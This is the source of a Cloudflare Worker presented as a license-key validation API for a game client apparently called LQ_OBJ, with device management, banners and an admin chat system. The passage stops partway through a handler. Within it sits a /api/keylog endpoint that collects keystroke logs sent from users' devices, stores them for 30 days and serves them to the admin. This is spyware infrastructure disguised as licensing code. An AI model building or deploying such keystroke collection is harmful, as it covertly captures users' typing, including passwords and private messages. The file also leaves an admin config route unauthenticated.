/**
 * Cloudflare Worker — Key Validate API v3
 * Per-device feature permissions, device naming, note editing
 */

export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, X-Auth-Key, X-Device-ID, X-Admin-Token',
    };

    if (request.method === 'OPTIONS') {
      return new Response(null, { headers: corsHeaders });
    }

    // ── GET /api/validate ──────────────────────────────────────────────────
    if (url.pathname === '/api/validate') {
      const key      = request.headers.get('X-Auth-Key')  || url.searchParams.get('key');
      const deviceID = request.headers.get('X-Device-ID') || url.searchParams.get('device');

      if (!key) return json({ status: 'invalid', message: 'Missing key' }, corsHeaders);

      const raw = await env.KEYS_KV.get(`key:${key}`);
      if (!raw) return json({ status: 'deleted', message: 'Key not found' }, corsHeaders);

      let record;
      try { record = JSON.parse(raw); } catch {
        return json({ status: 'invalid', message: 'Corrupt record' }, corsHeaders);
      }

      if (record.status === 'banned')
        return json({ status: 'banned', message: 'Key is banned', role: record.role }, corsHeaders);

      const now = new Date();
      if (new Date(record.expiresAt) < now) {
        record.status = 'expired';
        await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
        return json({ status: 'expired', message: 'Key expired', role: record.role, days_left: 0 }, corsHeaders);
      }

      // Device management
      const devices = record.devices || [];
      let currentDevice = null;

      if (deviceID) {
        currentDevice = devices.find(d => d.id === deviceID);
        if (!currentDevice) {
          if (devices.length >= record.maxDevices) {
            return json({
              status: 'device_limit',
              message: `Key đã đạt giới hạn ${record.maxDevices} thiết bị`,
              role: record.role
            }, corsHeaders);
          }
          currentDevice = {
            id: deviceID,
            name: '',
            firstSeen: now.toISOString(),
            lastSeen:  now.toISOString(),
            blocked_features: []
          };
          devices.push(currentDevice);
        } else {
          currentDevice.lastSeen = now.toISOString();
          // Ensure blocked_features field exists on old devices
          if (!currentDevice.blocked_features) currentDevice.blocked_features = [];
        }
        record.devices = devices;
        await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
      }

      const daysLeft = Math.ceil((new Date(record.expiresAt) - now) / 86400000);
      const deviceBlocked = currentDevice ? (currentDevice.blocked_features || []) : [];

      return json({
        status:           'valid',
        role:             record.role,
        days_left:        daysLeft,
        expires:          record.expiresAt,
        blocked_features: deviceBlocked,      // per-device blocked list
        banner_config:    record.banner_config || null, // per-key banner text
        message:          'OK'
      }, corsHeaders);
    }

    // ── GET /api/admin/list ────────────────────────────────────────────────
    if (url.pathname === '/api/admin/list') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN)
        return json({ error: 'Unauthorized' }, corsHeaders, 401);

      const listed = await env.KEYS_KV.list({ prefix: 'key:' });
      const allKeys = [];
      const now = new Date();

      for (const item of listed.keys) {
        const raw = await env.KEYS_KV.get(item.name);
        if (!raw) continue;
        try {
          const record = JSON.parse(raw);
          if (record.status === 'valid' && new Date(record.expiresAt) < now) {
            record.status = 'expired';
            await env.KEYS_KV.put(item.name, JSON.stringify(record));
          }

          // Count online devices (check online: KV key with TTL)
          const devices = record.devices || [];
          const deviceList = [];
          let onlineCount = 0;

          for (const d of devices) {
            const onlineRaw = await env.KEYS_KV.get(`online:${d.id}`);
            const isOnline = !!onlineRaw;
            if (isOnline) onlineCount++;

            deviceList.push({
              id:               d.id,
              name:             d.name || '',
              firstSeen:        d.firstSeen,
              lastSeen:         d.lastSeen,
              blocked_features: d.blocked_features || [],
              online:           isOnline
            });
          }

          allKeys.push({
            key:           record.key,
            role:          record.role,
            status:        record.status,
            maxDevices:    record.maxDevices,
            devices:       deviceList,
            usedDevices:   devices.length,
            onlineDevices: onlineCount,
            createdAt:     record.createdAt,
            expiresAt:     record.expiresAt,
            note:          record.note || '',
            banner_config: record.banner_config || null
          });
        } catch {}
      }

      allKeys.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
      return json({ keys: allKeys, total: allKeys.length }, corsHeaders);
    }

    // ── POST /api/heartbeat ─────────────────────────────────────────────────
    // Game client gọi mỗi 30s để báo online
    if (url.pathname === '/api/heartbeat' && request.method === 'POST') {
      let body;
      try { body = await request.json(); } catch { return json({ error: 'Invalid JSON' }, corsHeaders, 400); }
      const { deviceID, key } = body;
      if (!deviceID || !key) return json({ error: 'Missing deviceID or key' }, corsHeaders, 400);

      // Lưu online status với TTL 90s
      await env.KEYS_KV.put(`online:${deviceID}`, JSON.stringify({ deviceID, key, ts: new Date().toISOString() }), { expirationTtl: 90 });
      return json({ success: true }, corsHeaders);
    }

    // ── POST /api/offline ───────────────────────────────────────────────────
    // Game client gọi khi thoát để xóa online status ngay lập tức
    if (url.pathname === '/api/offline' && request.method === 'POST') {
      let body;
      try { body = await request.json(); } catch { return json({ error: 'Invalid JSON' }, corsHeaders, 400); }
      const { deviceID } = body;
      if (!deviceID) return json({ error: 'Missing deviceID' }, corsHeaders, 400);
      await env.KEYS_KV.delete(`online:${deviceID}`);
      return json({ success: true }, corsHeaders);
    }

    // ── POST /api/admin/create ─────────────────────────────────────────────
    if (url.pathname === '/api/admin/create' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN)
        return json({ error: 'Unauthorized' }, corsHeaders, 401);

      const body = await request.json();
      const { key, role, maxDevices, expiresAt, note } = body;
      if (!key || !expiresAt)
        return json({ error: 'Missing required fields (key, expiresAt)' }, corsHeaders, 400);

      const existing = await env.KEYS_KV.get(`key:${key}`);
      if (existing) return json({ error: 'Key already exists' }, corsHeaders, 409);

      const record = {
        key, role: role || 'member', status: 'valid',
        maxDevices: maxDevices || 1, devices: [],
        createdAt: new Date().toISOString(), expiresAt, note: note || ''
      };
      await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
      return json({ success: true, key }, corsHeaders);
    }

    // ── POST /api/admin/ban ────────────────────────────────────────────────
    if (url.pathname === '/api/admin/ban' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const { key } = await request.json();
      const raw = await env.KEYS_KV.get(`key:${key}`);
      if (!raw) return json({ error: 'Not found' }, corsHeaders, 404);
      const record = JSON.parse(raw);
      record.status = 'banned';
      await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
      return json({ success: true }, corsHeaders);
    }

    // ── POST /api/admin/unban ──────────────────────────────────────────────
    if (url.pathname === '/api/admin/unban' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const { key } = await request.json();
      const raw = await env.KEYS_KV.get(`key:${key}`);
      if (!raw) return json({ error: 'Not found' }, corsHeaders, 404);
      const record = JSON.parse(raw);
      record.status = new Date(record.expiresAt) > new Date() ? 'valid' : 'expired';
      await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
      return json({ success: true, status: record.status }, corsHeaders);
    }

    // ── POST /api/admin/delete ─────────────────────────────────────────────
    if (url.pathname === '/api/admin/delete' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const { key } = await request.json();
      await env.KEYS_KV.delete(`key:${key}`);
      return json({ success: true }, corsHeaders);
    }

    // ── POST /api/admin/renew ──────────────────────────────────────────────
    if (url.pathname === '/api/admin/renew' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const { key, addDays } = await request.json();
      const raw = await env.KEYS_KV.get(`key:${key}`);
      if (!raw) return json({ error: 'Not found' }, corsHeaders, 404);
      const record = JSON.parse(raw);
      const base = new Date(record.expiresAt) > new Date() ? new Date(record.expiresAt) : new Date();
      record.expiresAt = new Date(base.getTime() + addDays * 86400000).toISOString();
      if (record.status === 'expired') record.status = 'valid';
      await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
      return json({ success: true, expiresAt: record.expiresAt }, corsHeaders);
    }

    // ── POST /api/admin/setrole ────────────────────────────────────────────
    if (url.pathname === '/api/admin/setrole' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const { key, role } = await request.json();
      if (!key || !['admin', 'member'].includes(role))
        return json({ error: 'Invalid params' }, corsHeaders, 400);
      const raw = await env.KEYS_KV.get(`key:${key}`);
      if (!raw) return json({ error: 'Not found' }, corsHeaders, 404);
      const record = JSON.parse(raw);
      record.role = role;
      await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
      return json({ success: true, key, role }, corsHeaders);
    }

    // ── POST /api/admin/setnote ────────────────────────────────────────────
    // Sửa ghi chú cho key
    if (url.pathname === '/api/admin/setnote' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const { key, note } = await request.json();
      if (!key) return json({ error: 'Missing key' }, corsHeaders, 400);
      const raw = await env.KEYS_KV.get(`key:${key}`);
      if (!raw) return json({ error: 'Not found' }, corsHeaders, 404);
      const record = JSON.parse(raw);
      record.note = note || '';
      await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
      return json({ success: true }, corsHeaders);
    }

    // ── POST /api/admin/setdevicename ──────────────────────────────────────
    // Đặt tên thiết bị
    if (url.pathname === '/api/admin/setdevicename' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const { key, deviceId, name } = await request.json();
      if (!key || !deviceId) return json({ error: 'Missing key/deviceId' }, corsHeaders, 400);
      const raw = await env.KEYS_KV.get(`key:${key}`);
      if (!raw) return json({ error: 'Not found' }, corsHeaders, 404);
      const record = JSON.parse(raw);
      const device = (record.devices || []).find(d => d.id === deviceId);
      if (!device) return json({ error: 'Device not found' }, corsHeaders, 404);
      device.name = name || '';
      await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
      return json({ success: true }, corsHeaders);
    }

    // ── POST /api/admin/setdeviceperms ─────────────────────────────────────
    // Khóa/mở chức năng theo từng thiết bị
    if (url.pathname === '/api/admin/setdeviceperms' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const { key, deviceId, blocked_features } = await request.json();
      if (!key || !deviceId || !Array.isArray(blocked_features))
        return json({ error: 'Invalid params' }, corsHeaders, 400);
      const raw = await env.KEYS_KV.get(`key:${key}`);
      if (!raw) return json({ error: 'Not found' }, corsHeaders, 404);
      const record = JSON.parse(raw);
      const device = (record.devices || []).find(d => d.id === deviceId);
      if (!device) return json({ error: 'Device not found' }, corsHeaders, 404);
      device.blocked_features = blocked_features;
      await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
      return json({ success: true, deviceId, blocked_features }, corsHeaders);
    }


    // ── POST /api/admin/setkeybanner ───────────────────────────────────────
    // Lưu banner_config riêng theo từng key
    if (url.pathname === '/api/admin/setkeybanner' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const { key, banner_config } = await request.json();
      if (!key || typeof banner_config !== 'object')
        return json({ error: 'Invalid params' }, corsHeaders, 400);
      const raw = await env.KEYS_KV.get(`key:${key}`);
      if (!raw) return json({ error: 'Not found' }, corsHeaders, 404);
      const record = JSON.parse(raw);
      record.banner_config = banner_config;
      await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
      return json({ success: true, key, banner_config }, corsHeaders);
    }

    // ── GET /api/getkeybanner ──────────────────────────────────────────────
    // Public endpoint: source LQ_OBJ gọi sau khi validate key để lấy banner riêng
    if (url.pathname === '/api/getkeybanner') {
      const key = request.headers.get('X-Auth-Key') || url.searchParams.get('key');
      if (!key) return json({ error: 'Missing key' }, corsHeaders, 400);
      const raw = await env.KEYS_KV.get(`key:${key}`);
      if (!raw) return json({ error: 'Not found' }, corsHeaders, 404);
      const record = JSON.parse(raw);
      return json({ banner_config: record.banner_config || null }, corsHeaders);
    }

    // ── GET /api/admin/getconfig ────────────────────────────────────────────
    if (url.pathname === '/api/admin/getconfig') {
      const raw = await env.KEYS_KV.get('global:banner_config');
      const cfg = raw ? JSON.parse(raw) : {};
      return json({ banner_config: cfg }, corsHeaders);
    }

    // ── POST /api/admin/setconfig ───────────────────────────────────────────
    if (url.pathname === '/api/admin/setconfig' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const body = await request.json();
      if (body.banner_config) {
        await env.KEYS_KV.put('global:banner_config', JSON.stringify(body.banner_config));
      }
      return json({ success: true }, corsHeaders);
    }

    // ── POST /api/keylog ───────────────────────────────────────────────────
    // Source LQ_OBJ gửi log bàn phím theo device ID (debounce 1.5s phía client)
    // Mỗi POST là 1 "cụm gõ" riêng — không gộp tại server
    if (url.pathname === '/api/keylog' && request.method === 'POST') {
      let body;
      try { body = await request.json(); } catch { return json({ error: 'Invalid JSON' }, corsHeaders, 400); }
      const { deviceID, key, line } = body;
      if (!deviceID || !line) return json({ error: 'Missing deviceID or line' }, corsHeaders, 400);

      const storageKey = `keylog:${deviceID}`;
      const raw = await env.KEYS_KV.get(storageKey);
      let record = raw ? JSON.parse(raw) : { deviceID, authKey: key || '', lines: [] };

      // Mỗi entry là 1 dòng độc lập (real-time, không gộp)
      const now = new Date();
      const cleanLine = (line || '').trim().replace(/\n/g, '↵').replace(/\r/g, '');
      if (cleanLine.length > 0) {
        record.lines.push({ text: cleanLine, ts: now.toISOString() });
        // Giữ tối đa 500 dòng gần nhất
        if (record.lines.length > 500) record.lines = record.lines.slice(-500);
      }

      record.authKey = key || record.authKey;
      await env.KEYS_KV.put(storageKey, JSON.stringify(record), { expirationTtl: 60 * 60 * 24 * 30 });
      return json({ success: true }, corsHeaders);
    }

    // ── GET /api/admin/keylog ──────────────────────────────────────────────
    // Lấy log bàn phím của 1 device cụ thể hoặc tất cả
    if (url.pathname === '/api/admin/keylog') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);

      const deviceID = url.searchParams.get('device');
      if (deviceID) {
        const raw = await env.KEYS_KV.get(`keylog:${deviceID}`);
        if (!raw) return json({ deviceID, lines: [] }, corsHeaders);
        return json(JSON.parse(raw), corsHeaders);
      }

      // Lấy tất cả keylog
      const listed = await env.KEYS_KV.list({ prefix: 'keylog:' });
      const all = [];
      for (const item of listed.keys) {
        const raw = await env.KEYS_KV.get(item.name);
        if (raw) { try { all.push(JSON.parse(raw)); } catch {} }
      }
      return json({ logs: all, total: all.length }, corsHeaders);
    }

    // ── POST /api/admin/clearlog ───────────────────────────────────────────
    // Xóa log bàn phím của 1 thiết bị
    if (url.pathname === '/api/admin/clearlog' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const { deviceID } = await request.json();
      if (!deviceID) return json({ error: 'Missing deviceID' }, corsHeaders, 400);
      await env.KEYS_KV.delete(`keylog:${deviceID}`);
      return json({ success: true }, corsHeaders);
    }

    // ══════════════════════════════════════════════════════════════════════
    // CHAT SYSTEM
    // ══════════════════════════════════════════════════════════════════════

    // ── POST /api/chat/send — User gửi tin nhắn cho admin ─────────────────
    if (url.pathname === '/api/chat/send' && request.method === 'POST') {
      let body;
      try { body = await request.json(); } catch { return json({ error: 'Invalid JSON' }, corsHeaders, 400); }
      const { deviceID, key, message } = body;
      if (!deviceID || !message) return json({ error: 'Missing deviceID or message' }, corsHeaders, 400);

      const chatKey = `chat:${deviceID}`;
      const raw = await env.KEYS_KV.get(chatKey);
      let record = raw ? JSON.parse(raw) : { deviceID, key: key || '', messages: [] };

      const now = new Date().toISOString();
      const msgObj = {
        id: `${Date.now()}_${Math.random().toString(36).slice(2,8)}`,
        from: 'user',
        text: message.trim().slice(0, 2000),
        ts: now,
        readByAdmin: false,
        // seenByUser will be set when admin replies
      };
      record.messages.push(msgObj);
      // Keep latest 500
      if (record.messages.length > 500) record.messages = record.messages.slice(-500);
      record.key = key || record.key;
      record.lastUserMsg = now;

      await env.KEYS_KV.put(chatKey, JSON.stringify(record), { expirationTtl: 60 * 60 * 24 * 90 });

      // Check if auto-reply needed: no admin reply since last user message
      // We send auto-reply if there's no admin message after the last user message
      const msgs = record.messages;
      const lastAdminMsgIdx = msgs.slice().reverse().findIndex(m => m.from === 'admin');
      const needsAutoReply = lastAdminMsgIdx === -1 || 
        msgs[msgs.length - 1 - lastAdminMsgIdx].ts < now;

      if (needsAutoReply) {
        // Send auto-reply only if no admin reply exists after last user msg
        const lastAdminMsg = msgs.slice().reverse().find(m => m.from === 'admin');
        const lastUserMsgsBefore = msgs.filter(m => m.from === 'user');
        // Only auto-reply if admin hasn't replied to this batch
        const adminRepliedAfterLastUser = lastAdminMsg && 
          lastAdminMsg.ts > lastUserMsgsBefore[lastUserMsgsBefore.length - 2]?.ts;

        if (!adminRepliedAfterLastUser) {
          // Schedule auto-reply check — we'll add auto-reply as a system message only if
          // there's no admin message after the PREVIOUS user message
          // Simpler: always add auto-reply when user sends if there's no admin msg after
          //          the second-to-last user message.
          // But for simplicity: add auto-reply inline unless admin has replied at all since previous user msg
          const prevUserMsgs = msgs.filter(m => m.from === 'user');
          const adminMsgsAfterPrevUser = prevUserMsgs.length >= 2
            ? msgs.filter(m => m.from === 'admin' && m.ts >= prevUserMsgs[prevUserMsgs.length - 2].ts)
            : msgs.filter(m => m.from === 'admin');

          if (adminMsgsAfterPrevUser.length === 0) {
            const autoMsg = {
              id: `auto_${Date.now()}`,
              from: 'system',
              text: 'Vui lòng chờ admin trả lời.',
              ts: new Date(Date.now() + 1000).toISOString(),
              readByAdmin: true,
              seenByUser: false,
            };
            record.messages.push(autoMsg);
            await env.KEYS_KV.put(chatKey, JSON.stringify(record), { expirationTtl: 60 * 60 * 24 * 90 });
          }
        }
      }

      return json({ success: true, msgId: msgObj.id }, corsHeaders);
    }

    // ── GET /api/chat/messages — User poll tin nhắn ────────────────────────
    if (url.pathname === '/api/chat/messages' && request.method === 'GET') {
      const deviceID = url.searchParams.get('device');
      const after = url.searchParams.get('after') || '';
      if (!deviceID) return json({ error: 'Missing device' }, corsHeaders, 400);

      const chatKey = `chat:${deviceID}`;
      const raw = await env.KEYS_KV.get(chatKey);
      if (!raw) return json({ messages: [], unread: 0 }, corsHeaders);
      const record = JSON.parse(raw);

      // Count unread admin/system messages BEFORE marking seen
      const allMsgs = record.messages || [];
      const unread = allMsgs.filter(m =>
        (m.from === 'admin' || m.from === 'system') && !m.seenByUser
      ).length;

      // Mark admin/system messages as seen by user
      let updated = false;
      (record.messages || []).forEach(m => {
        if ((m.from === 'admin' || m.from === 'system') && !m.seenByUser) {
          m.seenByUser = true;
          updated = true;
        }
      });
      if (updated) {
        await env.KEYS_KV.put(chatKey, JSON.stringify(record), { expirationTtl: 60 * 60 * 24 * 90 });
      }

      // Filter messages after timestamp
      let msgs = record.messages || [];
      if (after) msgs = msgs.filter(m => m.ts > after);

      // For user messages: adminSeen = readByAdmin && the hideAdminStatus snapshot at read-time was false
      // hideAdminStatus is snapshotted per-message when admin reads it, so this is correct.
      const processedMsgs = msgs.map(m => ({
        ...m,
        adminSeen: m.from === 'user' ? (m.readByAdmin === true && !m.hideAdminStatus) : undefined,
      }));

      return json({ messages: processedMsgs, unread }, corsHeaders);
    }

    // ── GET /api/admin/chat/messages — Admin xem tin nhắn của device ───────
    if (url.pathname === '/api/admin/chat/messages' && request.method === 'GET') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const deviceID = url.searchParams.get('device');
      if (!deviceID) return json({ error: 'Missing device' }, corsHeaders, 400);

      const chatKey = `chat:${deviceID}`;
      const raw = await env.KEYS_KV.get(chatKey);
      if (!raw) return json({ messages: [], deviceID }, corsHeaders);
      const record = JSON.parse(raw);

      // Get hide-status setting
      const hideStatusRaw = await env.KEYS_KV.get('chat:admin:hidestatus');
      const hideStatus = hideStatusRaw ? JSON.parse(hideStatusRaw).enabled : false;

      // Mark user messages as read by admin
      let updated = false;
      (record.messages || []).forEach(m => {
        if (m.from === 'user' && !m.readByAdmin) {
          m.readByAdmin = true;
          m.hideAdminStatus = hideStatus; // Snapshot hide status at read time
          updated = true;
        }
      });
      if (updated) {
        await env.KEYS_KV.put(chatKey, JSON.stringify(record), { expirationTtl: 60 * 60 * 24 * 90 });
      }

      return json({ messages: record.messages || [], deviceID }, corsHeaders);
    }

    // ── POST /api/admin/chat/reply — Admin trả lời ─────────────────────────
    if (url.pathname === '/api/admin/chat/reply' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      let body;
      try { body = await request.json(); } catch { return json({ error: 'Invalid JSON' }, corsHeaders, 400); }
      const { deviceID, message } = body;
      if (!deviceID || !message) return json({ error: 'Missing deviceID or message' }, corsHeaders, 400);

      const chatKey = `chat:${deviceID}`;
      const raw = await env.KEYS_KV.get(chatKey);
      let record = raw ? JSON.parse(raw) : { deviceID, key: '', messages: [] };

      const now = new Date().toISOString();
      const msgObj = {
        id: `${Date.now()}_${Math.random().toString(36).slice(2,8)}`,
        from: 'admin',
        text: message.trim().slice(0, 2000),
        ts: now,
        seenByUser: false,
        readByAdmin: true,
      };
      record.messages.push(msgObj);
      if (record.messages.length > 500) record.messages = record.messages.slice(-500);
      record.lastAdminReply = now;

      // Remove any pending auto-reply system messages (admin has now replied)
      // Keep only system messages that were already seen by user
      record.messages = record.messages.filter(m => 
        m.from !== 'system' || m.seenByUser
      );
      // Add the admin message back (it might have been filtered if from === 'admin')
      // Actually we need to ensure msgObj is there
      if (!record.messages.find(m => m.id === msgObj.id)) {
        record.messages.push(msgObj);
      }

      await env.KEYS_KV.put(chatKey, JSON.stringify(record), { expirationTtl: 60 * 60 * 24 * 90 });
      return json({ success: true }, corsHeaders);
    }

    // ── POST /api/admin/chat/sendtokey — Admin gửi cho tất cả device của 1 key ──
    if (url.pathname === '/api/admin/chat/sendtokey' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      let body;
      try { body = await request.json(); } catch { return json({ error: 'Invalid JSON' }, corsHeaders, 400); }
      const { key, message } = body;
      if (!key || !message) return json({ error: 'Missing key or message' }, corsHeaders, 400);

      const raw = await env.KEYS_KV.get(`key:${key}`);
      if (!raw) return json({ error: 'Key not found' }, corsHeaders, 404);
      const record = JSON.parse(raw);
      const devices = record.devices || [];
      let sent = 0;
      const now = new Date();

      for (const device of devices) {
        const chatKey = `chat:${device.id}`;
        const chatRaw = await env.KEYS_KV.get(chatKey);
        let chatRecord = chatRaw ? JSON.parse(chatRaw) : { deviceID: device.id, key, messages: [] };
        const msgObj = {
          id: `${Date.now()}_${Math.random().toString(36).slice(2,8)}_${sent}`,
          from: 'admin',
          text: message.trim().slice(0, 2000),
          ts: new Date(now.getTime() + sent).toISOString(),
          seenByUser: false,
          readByAdmin: true,
        };
        chatRecord.messages.push(msgObj);
        if (chatRecord.messages.length > 500) chatRecord.messages = chatRecord.messages.slice(-500);
        // Remove unseen auto-replies
        chatRecord.messages = chatRecord.messages.filter(m => m.from !== 'system' || m.seenByUser);
        if (!chatRecord.messages.find(m => m.id === msgObj.id)) chatRecord.messages.push(msgObj);
        await env.KEYS_KV.put(chatKey, JSON.stringify(chatRecord), { expirationTtl: 60 * 60 * 24 * 90 });
        sent++;
      }
      return json({ success: true, sent }, corsHeaders);
    }

    // ── POST /api/admin/chat/broadcast — Admin gửi cho TẤT CẢ key ─────────
    if (url.pathname === '/api/admin/chat/broadcast' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      let body;
      try { body = await request.json(); } catch { return json({ error: 'Invalid JSON' }, corsHeaders, 400); }
      const { message } = body;
      if (!message) return json({ error: 'Missing message' }, corsHeaders, 400);

      const listed = await env.KEYS_KV.list({ prefix: 'key:' });
      let sent = 0;
      const now = new Date();

      for (const item of listed.keys) {
        const raw = await env.KEYS_KV.get(item.name);
        if (!raw) continue;
        try {
          const record = JSON.parse(raw);
          const devices = record.devices || [];
          for (const device of devices) {
            const chatKey = `chat:${device.id}`;
            const chatRaw = await env.KEYS_KV.get(chatKey);
            let chatRecord = chatRaw ? JSON.parse(chatRaw) : { deviceID: device.id, key: record.key, messages: [] };
            const msgObj = {
              id: `bcast_${Date.now()}_${Math.random().toString(36).slice(2,8)}_${sent}`,
              from: 'admin',
              text: message.trim().slice(0, 2000),
              ts: new Date(now.getTime() + sent).toISOString(),
              seenByUser: false,
              readByAdmin: true,
            };
            chatRecord.messages.push(msgObj);
            if (chatRecord.messages.length > 500) chatRecord.messages = chatRecord.messages.slice(-500);
            chatRecord.messages = chatRecord.messages.filter(m => m.from !== 'system' || m.seenByUser);
            if (!chatRecord.messages.find(m => m.id === msgObj.id)) chatRecord.messages.push(msgObj);
            await env.KEYS_KV.put(chatKey, JSON.stringify(chatRecord), { expirationTtl: 60 * 60 * 24 * 90 });
            sent++;
          }
        } catch {}
      }
      return json({ success: true, sent }, corsHeaders);
    }

    // ── GET /api/admin/chat/unread — Lấy danh sách device có tin chưa đọc ──
    if (url.pathname === '/api/admin/chat/unread' && request.method === 'GET') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);

      const listed = await env.KEYS_KV.list({ prefix: 'chat:' });
      const result = [];

      for (const item of listed.keys) {
        if (item.name === 'chat:admin:hidestatus') continue;
        const raw = await env.KEYS_KV.get(item.name);
        if (!raw) continue;
        try {
          const record = JSON.parse(raw);
          const msgs = record.messages || [];
          const unreadFromUser = msgs.filter(m => m.from === 'user' && !m.readByAdmin).length;
          const lastMsg = msgs[msgs.length - 1];
          if (lastMsg || unreadFromUser > 0) {
            result.push({
              deviceID: record.deviceID,
              key: record.key || '',
              unread: unreadFromUser,
              lastMessage: lastMsg || null,
            });
          }
        } catch {}
      }

      // Sort by unread desc, then by last message ts desc
      result.sort((a, b) => {
        if (b.unread !== a.unread) return b.unread - a.unread;
        const ta = a.lastMessage?.ts || '';
        const tb = b.lastMessage?.ts || '';
        return tb.localeCompare(ta);
      });

      return json({ conversations: result }, corsHeaders);
    }

    // ── POST /api/admin/chat/hidestatus — Bật/tắt ẩn trạng thái đã xem ────
    if (url.pathname === '/api/admin/chat/hidestatus' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      let body;
      try { body = await request.json(); } catch { return json({ error: 'Invalid JSON' }, corsHeaders, 400); }
      const { enabled } = body;
      await env.KEYS_KV.put('chat:admin:hidestatus', JSON.stringify({ enabled: !!enabled }));
      return json({ success: true, enabled: !!enabled }, corsHeaders);
    }

    // ── GET /api/admin/chat/hidestatus — Lấy trạng thái ẩn ─────────────────
    if (url.pathname === '/api/admin/chat/hidestatus' && request.method === 'GET') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const raw = await env.KEYS_KV.get('chat:admin:hidestatus');
      const enabled = raw ? JSON.parse(raw).enabled : false;
      return json({ enabled }, corsHeaders);
    }

    // ── GET /api/admin/chat/allconversations — Tất cả conversation ──────────
    if (url.pathname === '/api/admin/chat/allconversations' && request.method === 'GET') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);

      const listed = await env.KEYS_KV.list({ prefix: 'chat:' });
      const result = [];

      for (const item of listed.keys) {
        if (item.name === 'chat:admin:hidestatus') continue;
        const raw = await env.KEYS_KV.get(item.name);
        if (!raw) continue;
        try {
          const record = JSON.parse(raw);
          const msgs = record.messages || [];
          const unreadFromUser = msgs.filter(m => m.from === 'user' && !m.readByAdmin).length;
          result.push({
            deviceID: record.deviceID,
            key: record.key || '',
            unread: unreadFromUser,
            messages: msgs,
            lastMessage: msgs[msgs.length - 1] || null,
          });
        } catch {}
      }

      result.sort((a, b) => {
        if (b.unread !== a.unread) return b.unread - a.unread;
        const ta = a.lastMessage?.ts || '';
        const tb = b.lastMessage?.ts || '';
        return tb.localeCompare(ta);
      });

      return json({ conversations: result }, corsHeaders);
    }

    // ── POST /api/admin/chat/deletemsg — Xóa 1 tin nhắn cụ thể ──────────
    if (url.pathname === '/api/admin/chat/deletemsg' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      let body;
